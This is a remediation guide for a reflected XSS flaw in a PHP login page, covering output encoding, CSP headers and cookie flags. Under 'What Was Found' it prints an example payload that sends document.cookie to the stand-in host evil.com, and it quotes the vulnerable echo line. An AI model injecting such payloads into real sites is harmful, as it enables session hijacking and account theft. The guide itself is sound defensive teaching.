# Cross-Site Scripting (XSS) — Remediation Guide

## Classification

| Standard | ID | Severity |
|---|---|---|
| **OWASP Top 10** | A03:2021 — Injection / A07:2021 — XSS | 🔴 High |
| **SANS/CWE** | CWE-79: Improper Neutralization of Input | High |
| **CERT** | IDS51-J / IDS16-J | High |
| **CVSS v3 Base Score** | 6.1 – 8.8 (depends on context) | |

---

## What Was Found

In `php login process php.php`, line 22:

```php
// VULNERABLE CODE — Reflected XSS
echo "<h1>Welcome back, " . $user . "!</h1>";
```

`$user` comes directly from `$_POST['username']` without any sanitization or encoding. An attacker can submit:

```
username = <script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

The browser renders this as a live `<script>` tag, executing the attacker's JavaScript in the victim's browser context — **stealing session cookies, credentials, or redirecting to phishing pages**.

---

## Types of XSS

| Type | Description | Example |
|---|---|---|
| **Reflected** | Input echoed immediately in response | Login username printed back |
| **Stored** | Malicious input saved to DB, shown to all users | Forum comment with `<script>` |
| **DOM-based** | JavaScript modifies the DOM from URL parameter | `location.hash` injected into `innerHTML` |

This finding is **Reflected XSS**.

---

## Remediation: Output Encoding

```php
<?php
// SECURE CODE — Output encoding with htmlspecialchars()

$user = $_POST['username'] ?? '';

// ✅ FIX: Encode all special HTML characters before echoing user input
//    ENT_QUOTES encodes both " and ' characters
//    UTF-8 specifies the character set to prevent encoding attacks
$safe_user = htmlspecialchars($user, ENT_QUOTES | ENT_HTML5, 'UTF-8');
echo "<h1>Welcome back, " . $safe_user . "!</h1>";

// What htmlspecialchars does:
//   <  →  &lt;
//   >  →  &gt;
//   "  →  &quot;
//   '  →  &#039;
//   &  →  &amp;
// The browser displays the text literally — the <script> tag is NEVER executed
?>
```

**Before encoding:**
```html
<h1>Welcome back, <script>alert('XSS')</script>!</h1>
```
→ Browser executes the script ❌

**After encoding:**
```html
<h1>Welcome back, &lt;script&gt;alert('XSS')&lt;/script&gt;!</h1>
```
→ Browser displays it as text ✅

---

## Context-Specific Encoding

Different contexts require different encoding functions:

| Insertion Context | Defence | PHP Function |
|---|---|---|
| **HTML body** | HTML entity encode | `htmlspecialchars($val, ENT_QUOTES, 'UTF-8')` |
| **HTML attribute** | HTML attribute encode | Same as above + wrap in quotes |
| **JavaScript** | JS escape | `json_encode($val)` |
| **URL parameter** | URL encode | `urlencode($val)` |
| **CSS** | CSS escape | Whitelist or use a library |

---

## Remediation: Content Security Policy (CSP)

Add a CSP header to your PHP pages as a **deep defence** layer. Even if XSS slips through, CSP blocks inline scripts:

```php
<?php
// In every PHP file that outputs HTML:
header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; object-src 'none'");
header("X-XSS-Protection: 1; mode=block");
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
?>
```

---

## Additional Defences

| Defence | Description |
|---|---|
| **HttpOnly Cookies** | `session_set_cookie_params(['httponly' => true])` — blocks JS from reading session cookie |
| **Secure Cookies** | `['secure' => true]` — only sent over HTTPS |
| **SameSite Cookies** | `['samesite' => 'Strict']` — CSRF protection |
| **Input Validation** | Reject or sanitize input that doesn't match expected format before processing |

---

## References
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79 Detail](https://cwe.mitre.org/data/definitions/79.html)
- [MDN — Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
